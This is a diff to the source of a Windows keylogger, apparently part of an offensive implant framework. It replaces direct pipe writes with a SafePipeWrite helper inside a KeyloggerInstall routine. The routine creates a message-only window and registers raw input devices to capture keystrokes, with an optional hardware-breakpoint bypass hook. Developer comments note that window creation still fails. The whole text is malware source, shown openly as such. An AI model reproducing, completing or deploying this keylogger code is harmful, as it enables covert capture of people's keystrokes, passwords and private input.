@@ -37,7 +37,7 @@ auto DECLFN KeyloggerInstall(
     Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, Instance->Pipe.Write );
 
 	CHAR* teststr = "[+] PIPE WORKSSS\n";
-	Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+    SafePipeWrite(teststr, Str::LengthA(teststr));
 
     if ( Instance->Ctx.Bypass ) {
         Hwbp::KeyloggerInit( Instance->Ctx.Bypass );
@@ -57,10 +57,10 @@ auto DECLFN KeyloggerInstall(
     }
 
 	teststr = "[+] Registered Window Class: \n";
-    Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+    SafePipeWrite(teststr, Str::LengthA(teststr));
     
 	teststr = "[*] Creating Message-Only Window 111...\n";
-    Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+    SafePipeWrite(teststr, Str::LengthA(teststr));
 
 	// NEED TO FIX BELOW CODE : issue in creating a message-only window
     HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
@@ -70,20 +70,20 @@ auto DECLFN KeyloggerInstall(
 
 	// not reaching here
     teststr = "[*] Creating Message-Only Window...\n";
-    Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+    SafePipeWrite(teststr, Str::LengthA(teststr));
 
 	Instance->Win32.DbgPrint("\n\n=======================\n[+] WindowHandle: %p\n\n", WindowHandle);
 
     if(! WindowHandle)
     {
 		teststr = "[!] Failed to create Message-Only Window\n";
-        Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+        SafePipeWrite(teststr, Str::LengthA(teststr));
 
         return KeyloggerCleanup();
     }
 
 	teststr = "[+] Created Message-Only Window\n";
-    Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+    SafePipeWrite(teststr, Str::LengthA(teststr));
 
     RAWINPUTDEVICE RawDevice = { 0 };
 
@@ -95,22 +95,19 @@ auto DECLFN KeyloggerInstall(
     if (!Instance->Win32.RegisterRawInputDevices(&RawDevice, 1, sizeof(RAWINPUTDEVICE)))
     {
 		teststr = "[!] Failed to register Raw Input Device\n";
-        Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+        SafePipeWrite(teststr, Str::LengthA(teststr));
 
         return KeyloggerCleanup();
     }
 
 	teststr = "[+] Registered Raw Input Device\n";
-    Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+	SafePipeWrite(teststr, Str::LengthA(teststr));
 
     MSG Msg = { 0 };
 
     // enter the window message processing loop 
     while (Instance->Win32.GetMessageW(&Msg, NULL, 0, 0))
     {
-        teststr = "[+] Got a messageeee!!! need to process or whatever lol\n";
-        Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
-
         Instance->Win32.TranslateMessage(&Msg);
         Instance->Win32.DispatchMessageW(&Msg);
     }
